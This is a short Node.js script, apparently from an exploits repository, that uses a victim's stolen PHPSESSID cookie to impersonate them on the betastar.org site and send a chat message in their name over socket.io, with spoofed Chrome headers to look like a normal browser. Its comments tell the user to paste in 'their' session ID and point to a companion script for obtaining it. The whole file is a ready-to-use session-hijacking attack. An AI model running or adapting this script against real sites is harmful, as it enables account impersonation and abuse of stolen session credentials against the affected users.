// You will need their PHPSESSID for this, see https://github.com/BlacketWare/exploits/blob/main/site/getSessID.js
// Just insert their ID in line 7, and the message to send on line 8.
// Node.JS can be easily run on Replit.
var { io } = require("socket.io-client");
const axios = require("axios");
var express = require("express");

let PHPSESSID = '';
let msgtosend = '';

axios.defaults.headers.common['Cookie'] = "PHPSESSID=" + PHPSESSID + ";";
axios.defaults.headers.common['sec-ch-ua'] = '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"';
axios.defaults.headers.common['origin'] = 'https://betastar.org';
axios.defaults.headers.common['referer'] = 'https://betastar.org';
axios.defaults.headers.common['dnt'] = '1';
axios.defaults.headers.common['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36';
axios.defaults.headers.common['sec-ch-ua-mobile'] = '?0';
axios.defaults.headers.common['sec-ch-ua-platform'] = '"Windows"';
axios.defaults.headers.common['sec-fetch-site'] = 'cross-site';
axios.defaults.headers.common['X-Requested-With'] = 'XMLHttpRequest';

var socket = io("https://betastar.org", {
  extraHeaders: {
    Cookie: "PHPSESSID=" + PHPSESSID + ";",
  }
});
socket.emit('smes', msgtosend);
